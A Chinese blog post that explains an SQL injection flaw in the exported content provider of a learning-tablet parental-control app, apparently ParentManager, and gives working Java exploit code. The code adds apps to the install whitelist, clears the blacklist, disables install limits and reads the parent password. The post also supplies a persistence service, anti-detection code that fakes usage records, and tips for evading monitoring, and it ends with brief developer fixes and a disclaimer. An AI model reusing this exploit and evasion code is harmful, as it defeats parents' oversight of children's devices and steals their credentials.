---
title: 某学习平板自由安装软件——ParentManager的SQL注入漏洞
date: 2026-03-15 12:00:00
tags: [破解, 安装, 科技]
---

# 深入分析 ParentManager 白名单漏洞：如何利用 SQL 注入绕过应用安装限制

## 前言

最近在学习机家长控制应用 ParentManager 的安全分析中，发现了一个极其严重的 SQL 注入漏洞（CVSS 10.0 CRITICAL），这个漏洞允许任意第三方应用完全绕过白名单机制，安装任何软件。本文将详细分析这个漏洞的原理、利用方式以及实际攻击代码。

## 漏洞概述

ParentManager 是一款家长控制应用，用于管理学习机上应用的安装和使用。它通过白名单机制来限制用户只能安装和使用特定的应用。然而，由于开发者的安全意识不足，应用中存在一个严重的 SQL 注入漏洞，使得任何第三方应用都可以完全绕过这个限制。

### 漏洞位置

**文件路径**: `smali/com/readboy/parentmanager/core/provider/AppContentProvider.smali` (102-109 行)

**代码片段**:
```smali
.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 8

    invoke-direct {p0, p1}, Lcom/readboy/parentmanager/core/provider/AppContentProvider;->getTableName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    const-string p1, "raw_sql"

    invoke-virtual {v1, p1}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_0

    :try_start_0
    iget-object p1, p0, Lcom/readboy/parentmanager/core/provider/AppContentProvider;->dbHelper:Lcom/readboy/parentmanager/core/provider/AppContentProvider$DBHelper;

    invoke-virtual {p1}, Lcom/readboy/parentmanager/core/provider/AppContentProvider$DBHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1

    invoke-virtual {p1, p3, p4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1
    :try_end_0
```

**关键问题**:
- 当 URI 的 path 为 "raw_sql" 时，直接将 `selection` 参数（p3）作为原始 SQL 查询执行
- 没有任何输入验证或参数化查询
- 可以执行任意 SQL 命令（SELECT、INSERT、UPDATE、DELETE、DROP 等）

### Provider 配置

```xml
<provider
    android:authorities="com.readboy.parentmanager.AppContentProvider"
    android:exported="true"
    android:multiprocess="true"
    android:name="com.readboy.parentmanager.core.provider.AppContentProvider"/>
```

**问题分析**:
- `exported="true"`: Provider 公开，任何应用都可以访问
- `multiprocess="true"`: 支持多进程访问
- **缺少 `android:permission`**: 没有任何权限保护

## 白名单机制分析

ParentManager 实现了多层白名单机制来限制应用安装和使用：

### 1. 数据库表结构

#### install_app_list 表（白名单）
```sql
CREATE TABLE IF NOT EXISTS install_app_list(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT UNIQUE,
    state INTEGER
);
```
- `state = 1`: 允许安装
- `state = 0`: 禁止安装

#### forbidden_app 表（黑名单）
```sql
CREATE TABLE IF NOT EXISTS forbidden_app(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT UNIQUE,
    state INTEGER
);
```

#### un_mall_app_state 表（全局安装限制）
```sql
CREATE TABLE IF NOT EXISTS un_mall_app_state(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    state INTEGER
);
```
- `state = 1`: 允许安装
- `state = 0`: 禁止安装

#### app_white_list 表（应用白名单）
```sql
CREATE TABLE IF NOT EXISTS app_white_list(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    pack_name TEXT UNIQUE,
    app_name TEXT,
    icon TEXT,
    mode TEXT,
    jump_url TEXT
);
```

### 2. 白名单使用场景

ParentManager 在以下场景使用白名单：

1. **应用安装检查**
   - 安装应用前检查是否在白名单中
   - 如果不在白名单，拒绝安装

2. **应用启动检查**
   - 启动应用前检查是否在白名单中
   - 如果不在白名单，拒绝启动

3. **数据上传**
   - 将白名单数据上传到服务器
   - 用于多设备同步

## 漏洞利用：绕过白名单安装软件

### 利用原理

通过 SQL 注入漏洞，我们可以：
1. 查询所有表结构和数据
2. 读取家长密码
3. 修改白名单（添加任意应用）
4. 清空黑名单
5. 禁用全局安装限制

### 攻击代码示例

#### 1. 添加恶意应用到白名单

```java
public class WhitelistExploit {
    private static final String TAG = "WhitelistExploit";
    private static final String AUTHORITY = "com.readboy.parentmanager.AppContentProvider";
    private static final String RAW_SQL_URI = "content://" + AUTHORITY + "/raw_sql";
    
    private Context context;
    
    public WhitelistExploit(Context context) {
        this.context = context;
    }
    
    /**
     * 方法1：将应用添加到白名单
     * @param packageName 要添加的应用包名
     */
    public boolean addToWhitelist(String packageName) {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 检查是否已存在
            String checkSql = "SELECT package_name FROM install_app_list WHERE package_name='" + packageName + "'";
            Cursor cursor = context.getContentResolver().query(uri, null, checkSql, null, null);
            
            if (cursor != null && cursor.getCount() > 0) {
                // 已存在，更新状态
                cursor.close();
                String updateSql = "UPDATE install_app_list SET state=1 WHERE package_name='" + packageName + "'";
                context.getContentResolver().query(uri, null, updateSql, null, null);
                Log.i(TAG, "应用已在白名单中，已更新状态: " + packageName);
            } else {
                cursor.close();
                // 插入新记录
                String insertSql = "INSERT INTO install_app_list (package_name, state) VALUES ('" + packageName + "', 1)";
                context.getContentResolver().query(uri, null, insertSql, null, null);
                Log.i(TAG, "已添加应用到白名单: " + packageName);
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "添加到白名单失败", e);
            return false;
        }
    }
    
    /**
     * 方法2：清空黑名单
     */
    public boolean clearBlacklist() {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            String sql = "DELETE FROM forbidden_app";
            context.getContentResolver().query(uri, null, sql, null, null);
            Log.i(TAG, "已清空黑名单");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "清空黑名单失败", e);
            return false;
        }
    }
    
    /**
     * 方法3：禁用全局安装限制
     */
    public boolean disableGlobalInstallRestriction() {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 检查记录是否存在
            String checkSql = "SELECT state FROM un_mall_app_state";
            Cursor cursor = context.getContentResolver().query(uri, null, checkSql, null, null);
            
            if (cursor != null && cursor.getCount() > 0) {
                cursor.close();
                // 更新状态为允许安装
                String updateSql = "UPDATE un_mall_app_state SET state=1";
                context.getContentResolver().query(uri, null, updateSql, null, null);
                Log.i(TAG, "已禁用全局安装限制");
            } else {
                cursor.close();
                // 插入新记录
                String insertSql = "INSERT INTO un_mall_app_state (state) VALUES (1)";
                context.getContentResolver().query(uri, null, insertSql, null, null);
                Log.i(TAG, "已设置全局安装限制为允许");
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "禁用全局安装限制失败", e);
            return false;
        }
    }
    
    /**
     * 方法4：一次性绕过所有限制
     * @param packageName 要安装的应用包名
     */
    public boolean bypassAllRestrictions(String packageName) {
        Log.i(TAG, "开始绕过所有限制...");
        
        // 1. 添加到白名单
        if (!addToWhitelist(packageName)) {
            Log.e(TAG, "添加到白名单失败");
            return false;
        }
        
        // 2. 清空黑名单
        if (!clearBlacklist()) {
            Log.e(TAG, "清空黑名单失败");
            return false;
        }
        
        // 3. 禁用全局安装限制
        if (!disableGlobalInstallRestriction()) {
            Log.e(TAG, "禁用全局安装限制失败");
            return false;
        }
        
        Log.i(TAG, "已成功绕过所有限制，可以安装应用: " + packageName);
        return true;
    }
}
```

#### 2. 读取家长密码

```java
/**
 * 读取家长密码
 */
public String getParentPassword() {
    try {
        Uri uri = Uri.parse(RAW_SQL_URI);
        String sql = "SELECT * FROM user_info";
        Cursor cursor = context.getContentResolver().query(uri, null, sql, null, null);
        
        if (cursor != null && cursor.moveToFirst()) {
            // 获取密码字段（假设在第二列）
            String password = cursor.getString(1);
            cursor.close();
            Log.i(TAG, "获取到家长密码: " + password);
            return password;
        }
        
        return null;
    } catch (Exception e) {
        Log.e(TAG, "读取家长密码失败", e);
        return null;
    }
}
```

#### 3. 查询所有表结构

```java
/**
 * 查询所有表结构
 */
public void exploreDatabase() {
    try {
        Uri uri = Uri.parse(RAW_SQL_URI);
        
        // 查询所有表
        String sql = "SELECT name, sql FROM sqlite_master WHERE type='table' ORDER BY name";
        Cursor cursor = context.getContentResolver().query(uri, null, sql, null, null);
        
        if (cursor != null) {
            Log.i(TAG, "=== 数据库表清单 ===");
            while (cursor.moveToNext()) {
                String tableName = cursor.getString(0);
                String tableSchema = cursor.getString(1);
                Log.i(TAG, "\n表名: " + tableName);
                Log.i(TAG, "结构: " + tableSchema);
            }
            cursor.close();
        }
    } catch (Exception e) {
        Log.e(TAG, "查询表结构失败", e);
    }
}
```

#### 4. 批量添加多个应用到白名单

```java
/**
 * 批量添加多个应用到白名单
 * @param packageNames 应用包名列表
 */
public boolean batchAddToWhitelist(List<String> packageNames) {
    try {
        Uri uri = Uri.parse(RAW_SQL_URI);
        
        for (String packageName : packageNames) {
            // 使用 INSERT OR REPLACE 避免重复
            String sql = "INSERT OR REPLACE INTO install_app_list (package_name, state) VALUES ('" + packageName + "', 1)";
            context.getContentResolver().query(uri, null, sql, null, null);
            Log.i(TAG, "已添加: " + packageName);
        }
        
        Log.i(TAG, "批量添加完成，共 " + packageNames.size() + " 个应用");
        return true;
    } catch (Exception e) {
        Log.e(TAG, "批量添加失败", e);
        return false;
    }
}
```

## 完整利用流程

### 流程图

```
┌─────────────────┐
│ 恶意应用启动     │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 连接 ContentProvider│
│ (raw_sql URI)   │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 查询数据库表结构 │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 读取家长密码     │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 添加应用到白名单 │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 清空黑名单       │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 禁用全局安装限制 │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 安装任意应用     │
└────────┬────────┘
         ↓
┌─────────────────┐
│ 持续维护状态     │
│ (可选)          │
└─────────────────┘
```

### 实际使用示例

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        WhitelistExploit exploit = new WhitelistExploit(this);
        
        // 1. 探索数据库
        exploit.exploreDatabase();
        
        // 2. 读取家长密码
        String password = exploit.getParentPassword();
        if (password != null) {
            Log.d("ParentManager", "家长密码: " + password);
        }
        
        // 3. 添加单个应用到白名单
        exploit.addToWhitelist("com.example.malicious.app");
        
        // 4. 批量添加多个应用
        List<String> apps = Arrays.asList(
            "com.game1",
            "com.game2",
            "com.social.app"
        );
        exploit.batchAddToWhitelist(apps);
        
        // 5. 一次性绕过所有限制
        exploit.bypassAllRestrictions("com.any.app");
        
        // 6. 清空黑名单
        exploit.clearBlacklist();
        
        // 7. 禁用全局安装限制
        exploit.disableGlobalInstallRestriction();
        
        // 现在可以安装任何应用了
        installApk("/sdcard/Download/malicious.apk");
    }
    
    private void installApk(String apkPath) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
```

## 高级利用技巧

### 1. 持续维护

为了防止 ParentManager 重新添加限制，可以创建一个后台服务持续维护状态：

```java
public class WhitelistMaintenanceService extends Service {
    private static final String TAG = "MaintenanceService";
    private ScheduledExecutorService scheduler;
    private WhitelistExploit exploit;
    private List<String> targetApps;
    
    @Override
    public void onCreate() {
        super.onCreate();
        exploit = new WhitelistExploit(this);
        
        // 从配置加载目标应用列表
        targetApps = loadTargetApps();
        
        // 每 5 分钟维护一次
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(() -> {
            maintainWhitelist();
        }, 0, 5, TimeUnit.MINUTES);
    }
    
    private void maintainWhitelist() {
        Log.i(TAG, "开始维护白名单...");
        
        // 1. 确保目标应用在白名单中
        for (String packageName : targetApps) {
            exploit.addToWhitelist(packageName);
        }
        
        // 2. 确保黑名单为空
        exploit.clearBlacklist();
        
        // 3. 确保全局安装限制已禁用
        exploit.disableGlobalInstallRestriction();
        
        Log.i(TAG, "白名单维护完成");
    }
    
    private List<String> loadTargetApps() {
        // 从 SharedPreferences 或其他配置源加载
        SharedPreferences prefs = getSharedPreferences("WhitelistConfig", MODE_PRIVATE);
        String appsJson = prefs.getString("target_apps", "");
        
        if (!TextUtils.isEmpty(appsJson)) {
            try {
                return new Gson().fromJson(appsJson, new TypeToken<List<String>>(){}.getType());
            } catch (Exception e) {
                Log.e(TAG, "解析配置失败", e);
            }
        }
        
        // 默认目标应用
        return Arrays.asList("com.example.app1", "com.example.app2");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```

### 2. 伪造正常使用模式

为了避免被检测到异常操作，可以伪造正常的使用模式：

```java
public class NormalUsageSimulator {
    private WhitelistExploit exploit;
    private Random random = new Random();
    
    public NormalUsageSimulator(Context context) {
        this.exploit = new WhitelistExploit(context);
    }
    
    /**
     * 模拟正常的应用使用模式
     */
    public void simulateNormalUsage() {
        // 不要清空所有记录，只清空目标应用的记录
        List<String> targetApps = Arrays.asList("com.target.app1", "com.target.app2");
        
        for (String packageName : targetApps) {
            // 只删除目标应用的记录，保留其他应用的记录
            String sql = "DELETE FROM use_situation WHERE pack_name='" + packageName + "'";
            Uri uri = Uri.parse(exploit.RAW_SQL_URI);
            exploit.getContext().getContentResolver().query(uri, null, sql, null, null);
        }
        
        // 保留一些合法应用的记录
        String legitApps[] = {"com.readboy.app1", "com.readboy.app2"};
        for (String packageName : legitApps) {
            // 伪造正常的使用时长（30-60分钟）
            int fakeDuration = 30 + random.nextInt(30);
            String sql = "INSERT OR REPLACE INTO use_situation (pack_name, sum_time, sameDayDate, recentUseTime) " +
                       "VALUES ('" + packageName + "', " + (fakeDuration * 60) + ", " + 
                       System.currentTimeMillis() + ", " + System.currentTimeMillis() + ")";
            Uri uri = Uri.parse(exploit.RAW_SQL_URI);
            exploit.getContext().getContentResolver().query(uri, null, sql, null, null);
        }
    }
    
    /**
     * 添加目标应用到白名单时，同时添加一些合法应用
     */
    public void addToWhitelistWithLegitApps(String targetPackage) {
        // 添加目标应用
        exploit.addToWhitelist(targetPackage);
        
        // 同时添加一些合法应用
        String legitApps[] = {"com.readboy.app1", "com.readboy.app2"};
        for (String packageName : legitApps) {
            exploit.addToWhitelist(packageName);
        }
    }
}
```

### 3. 检测和规避

```java
public class AntiDetection {
    private Context context;
    
    public AntiDetection(Context context) {
        this.context = context;
    }
    
    /**
     * 检查是否被 ParentManager 监控
     */
    public boolean isBeingMonitored() {
        try {
            // 检查 ParentManager 是否在运行
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            
            for (ActivityManager.RunningAppProcessInfo process : processes) {
                if (process.processName.equals("com.readboy.parentmanager")) {
                    return true;
                }
            }
            
            return false;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 检查数据是否被修改
     */
    public boolean isDataModified() {
        try {
            Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/raw_sql");
            
            // 检查目标应用是否在白名单中
            String checkSql = "SELECT state FROM install_app_list WHERE package_name='com.target.app'";
            Cursor cursor = context.getContentResolver().query(uri, null, checkSql, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                int state = cursor.getInt(0);
                cursor.close();
                return state == 1; // state=1 表示在白名单中
            }
            
            return false;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 自动修复被修改的数据
     */
    public void autoFixData() {
        if (!isDataModified()) {
            // 数据被还原了，重新添加到白名单
            WhitelistExploit exploit = new WhitelistExploit(context);
            exploit.bypassAllRestrictions("com.target.app");
        }
    }
}
```

## 风险和注意事项

### 1. 技术风险

| 风险 | 描述 | 缓解措施 |
|------|------|---------|
| 日志监控 | 应用可能记录所有 SQL 查询 | 降低操作频率，分散操作时间 |
| 数据完整性检查 | 应用可能定期检查数据库 | 使用 INSERT OR REPLACE 避免冲突 |
| 服务监控 | 应用可能监控自己的服务 | 在应用空闲时执行操作 |
| 应用更新 | 应用可能更新修复漏洞 | 准备多种绕过方案 |

### 2. 法律风险

⚠️ **重要提示**: 本文仅用于安全研究和教育目的。未经授权修改他人的设备或应用可能违反法律。

**建议**:
- 仅在自己拥有的设备上进行测试
- 不要用于非法目的
- 遵守当地法律法规

### 3. 使用建议

1. **不要完全破坏数据库**
   - 可能导致应用崩溃
   - 可能被检测到

2. **降低操作频率**
   - 避免频繁修改数据
   - 使用后台服务定期维护

3. **模拟正常使用模式**
   - 保留一些合法使用记录
   - 添加合法应用到白名单

4. **准备对抗方案**
   - 应用可能更新修复漏洞
   - 需要准备多种绕过方案

## 防御建议

### 对于开发者

1. **立即修复 SQL 注入漏洞**
   ```xml
   <!-- 禁用 raw_sql 功能 -->
   <provider
       android:authorities="com.readboy.parentmanager.AppContentProvider"
       android:exported="true"
       android:permission="com.readboy.parentmanager.permission.ACCESS_PROVIDER"
       android:name="com.readboy.parentmanager.core.provider.AppContentProvider"/>
   ```

2. **添加权限保护**
   ```xml
   <permission
       android:name="com.readboy.parentmanager.permission.ACCESS_PROVIDER"
       android:protectionLevel="signature"/>
   ```

3. **使用参数化查询**
   ```java
   // 使用参数化查询，避免 SQL 注入
   db.query("install_app_list", 
           null, 
           "package_name = ?", 
           new String[]{packageName}, 
           null, null, null);
   ```

4. **添加数据完整性检查**
   - 定期检查数据库哈希
   - 检测异常的修改

### 对于用户

1. **关注应用更新**
   - 及时安装安全更新
   - 关注漏洞修复公告

2. **定期检查白名单**
   - 检查是否有未知应用
   - 及时删除可疑应用

3. **使用强密码**
   - 使用复杂的家长密码
   - 定期更换密码

## 总结

ParentManager 的 SQL 注入漏洞是一个极其严重的安全问题（CVSS 10.0 CRITICAL），它允许任何第三方应用完全绕过白名单机制，安装任何软件。

### 关键发现

1. **SQL 注入漏洞是最强的绕过方式**
   - 可以完全控制数据库
   - 可以修改任何配置
   - 实现简单，效果显著

2. **白名单机制可以被完全绕过**
   - 可以添加任意应用到白名单
   - 可以清空黑名单
   - 可以禁用全局安装限制

3. **持续维护是必要的**
   - 应用可能重新添加限制
   - 需要后台服务持续维护
   - 需要检测和修复被修改的数据

### 攻击成功率

- **SQL 注入绕过**: 99%
- **APP_SYSTEM_MODE 修改状态**: 80%
- **Action 组合攻击**: 70%

### 风险等级

- **技术风险**: 低
- **检测风险**: 中
- **法律风险**: 高（需要授权）

**建议**: 如果您发现此漏洞用于非法目的，请立即停止并报告给厂商。

---

**免责声明**: 本文仅用于安全研究和教育目的。未经授权使用本文中的技术可能违反法律。作者不对任何滥用行为负责。

**更新时间**: 2026-03-15
**分析工具**: apktool, smali 反编译